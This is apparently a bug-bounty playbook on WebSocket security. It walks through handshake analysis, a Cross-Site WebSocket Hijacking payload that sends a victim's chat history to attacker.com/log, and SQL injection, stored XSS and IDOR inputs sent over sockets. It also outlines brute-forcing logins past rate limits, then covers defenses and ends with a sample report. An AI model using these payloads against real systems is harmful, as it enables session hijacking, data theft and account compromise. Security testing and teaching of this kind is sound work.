# WebSocket Security and Hijacking

## When to Use
- When traffic relies on `wss://` (WebSocket Secure) protocol instead of standard HTTPS API requests.
- When attacking applications boasting "real-time" sync (live stock tickers, crypto charts, messaging apps, multiplayer games).
- To detect Cross-Site WebSocket Hijacking (CSWSH), which allows an attacker to establish a valid bidirectional socket over the victim's session.


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Analyzing the Handshake

```http
# Concept: WebSockets begin life as a standard HTTP GET request seeking an "Upgrade"
# to the WebSocket protocol. If the server authenticates this solely via Cookies without
# CSRF protection (like an Anti-CSRF token), it is vulnerable to CSWSH.

# 1. Intercept the Connection Upgrade in Burp Suite
GET /chat/socket HTTP/1.1
Host: wss.target.com
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Version: 13
Cookie: session_id=xyz123...

# Observe: Is there an Anti-CSRF token in the URL or headers? (e.g., `?token=random123`)
# If NO, and the connection relies strictly on the `session_id` cookie, proceed to Phase 2.
```

### Phase 2: Cross-Site WebSocket Hijacking (CSWSH) Execution

```html
<!-- Concept: Similar to CSRF, we trick the victim's browser into executing an action. -->
<!-- However, CSWSH is devastating because the attacker gains a persistent, TWO-WAY 
     read/write connection to the application, unlike normal CSRF which is "fire and forget". -->

<!-- 1. Host this exploit payload on attacker.com -->
<!-- When the victim views this page, their browser automatically attaches their `session_id` cookie. -->

<script>
    // Initiate the WebSocket connection to the target
    var ws = new WebSocket('wss://wss.target.com/chat/socket');
    
    // When the socket opens, send a command simulating the victim
    ws.onopen = function() {
        ws.send(JSON.stringify({"action": "get_chat_history"}));
    };
    
    // When the server responds with the massive chat history payload...
    ws.onmessage = function(event) {
        // Exfiltrate the victim's read data back to our attacker server
        fetch('https://attacker.com/log', {
            method: 'POST',
            body: event.data
        });
    };
</script>
```

### Phase 3: Manipulating WebSocket Messages (In-Band Attacks)

```text
# Concept: Developers often assume that because it is a socket connection, standard
# web vulnerabilities (SQLi, XSS) don't apply. This is completely false.

# 1. Inspect the WS History tab in Burp Suite.
# 2. Replay/Modify incoming and outgoing JSON messages.

# Attack A: Blind SQL Injection via Sockets
Send: {"action": "fetch_user", "id": "1' OR SLEEP(10)--"}
# If the socket hangs for 10 seconds before replying, blind SQLi is confirmed.

# Attack B: Stored XSS
Send: {"message": "<img src=x onerror=alert(1)>", "room": "general"}
# All other connected clients immediately execute the XSS when their socket renders the chat.

# Attack C: IDOR (Insecure Direct Object Reference)
Send: {"action": "delete_message", "message_id": 999}
# If you can delete a message belonging to another user without permissions.
```

### Phase 4: Bypassing Rate Limits via Sockets

```text
# Concept: WAFs and rate-limiters are predominantly configured to monitor HTTP traffic (e.g., 5 POST requests per second).
# Once a WebSocket is established, it bypasses HTTP logging, allowing infinite message spam.

# Attack: Application Brute Forcing over WS
# Write a Python script using the `websockets` library to send 10,000 authentication attempts per second over a single established socket connection.
# The WAF will be completely blind to this because it only sees ONE established TCP connection.
```

## 🔵 Blue Team Detection & Defense
- **Origin Header Validation**: During the WebSocket handshake, the server must strictly validate the `Origin` header. If the initial request does not originate from a trusted frontend domain, reject the `101 Switching Protocols` upgrade.
- **Session Tokens vs Cookies**: Do not rely on ambient browser cookies for WebSocket authentication. Instead, authenticate the socket immediately after it opens by requiring the client to explicitly send a Bearer token or CSRF token in the first data frame.
- **Socket Rate Limiting**: Implement application-level rate limiting on the number of messages a single socket identifier can process per second to prevent brute-forcing and denial-of-service conditions.

## Key Concepts
| Concept | Description |
|---------|-------------|
| WebSocket | A protocol providing persistent, full-duplex communication channels over a single TCP connection |
| CSWSH | Cross-Site WebSocket Hijacking; an exploit allowing an attacker to establish a socket authenticated as the victim |
| Full-Duplex | Data can be transmitted in both directions simultaneously, independent of request/response cycles |

## Output Format
```
Bug Bounty Report: CSWSH leading to PII Exfiltration
====================================================
Vulnerability: Cross-Site WebSocket Hijacking
Severity: High (CVSS 8.1)
Target: wss://trading.target.com/live

Description:
The real-time trading application establishes a WebSocket connection using a standard HTTP upgrade request reliant solely on the user's ambient session cookie. The handshake mechanism fails to validate the `Origin` header and lacks any randomized CSRF tokens.

An attacker can host a malicious payload on an external site. When a logged-in trader visits the attacker's site, the browser silently establishes a WebSocket back to `trading.target.com`. Crucially, because WebSockets are bidirectional, the attacker's script can issue commands (e.g., `{"command": "get_portfolio"}`) and read the server's responses, bypassing Same-Origin Policy constraints entirely.

Reproduction Steps:
[Include HTML payload script]
1. Open the attacker HTML payload in a browser with an active trading session.
2. Observe network traffic reflecting the portfolio values being transmitted to the attacker's logging server.

Impact:
Complete exposure of real-time account data, trading history, and portfolio balances.
